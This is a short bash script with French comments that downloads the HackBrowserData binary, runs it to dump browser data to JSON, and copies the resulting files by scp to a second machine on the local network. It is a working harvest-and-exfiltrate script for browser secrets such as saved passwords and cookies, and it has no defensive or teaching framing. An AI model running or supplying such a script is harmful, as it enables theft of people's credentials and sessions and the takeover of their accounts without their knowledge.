#!/bin/bash

# Variables
SERVER_USER="123"
SERVER_IP="192.168.0.54"  # IP du premier PC
DEST_DIR="/home/$SERVER_USER/hackbrowserdata"
LOCAL_PATH="$HOME/hackbrowserdata"

# Vérifier que SSH fonctionne avant de commencer
echo "[+] Test de connexion SSH..."
ssh -o BatchMode=yes -o ConnectTimeout=5 $SERVER_USER@$SERVER_IP "echo SSH OK" 2>/dev/null
if [ $? -ne 0 ]; then
    echo "[!] Erreur : Impossible de se connecter à $SERVER_IP en SSH. Vérifie ton serveur SSH."
    exit 1
fi

# Créer un dossier temporaire
mkdir -p "$LOCAL_PATH"
cd "$LOCAL_PATH" || exit

# Installer les outils nécessaires (si non installés)
echo "[+] Vérification des dépendances..."
if ! command -v unzip &> /dev/null; then
    echo "[+] Installation de unzip..."
    sudo apt update && sudo apt install unzip -y
fi

# Télécharger HackBrowserData
echo "[+] Téléchargement de HackBrowserData..."
wget -q --show-progress "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-linux-64bit.zip" -O hackbrowserdata.zip

# Vérifier si le fichier a été bien téléchargé
if [ ! -f "hackbrowserdata.zip" ]; then
    echo "[!] Erreur : Fichier hackbrowserdata.zip introuvable !"
    exit 1
fi

# Extraire l’archive
echo "[+] Extraction..."
unzip -o hackbrowserdata.zip

# Vérifier si le fichier binaire existe
if [ ! -f "hack-browser-data" ]; then
    echo "[!] Erreur : Fichier hack-browser-data introuvable après extraction."
    exit 1
fi

# Donner les permissions d'exécution
chmod +x hack-browser-data

# Exécuter HackBrowserData
echo "[+] Extraction des données..."
./hack-browser-data -o json

# Vérifier si des fichiers JSON ont été créés
if ls *.json 1> /dev/null 2>&1; then
    echo "[+] Envoi des fichiers au premier PC..."
    scp -r *.json $SERVER_USER@$SERVER_IP:$DEST_DIR
    echo "[+] Terminé ! Les fichiers sont sur $SERVER_IP:$DEST_DIR"
else
    echo "[!] Erreur : Aucun fichier JSON trouvé. HackBrowserData a peut-être échoué."
    exit 1
fi
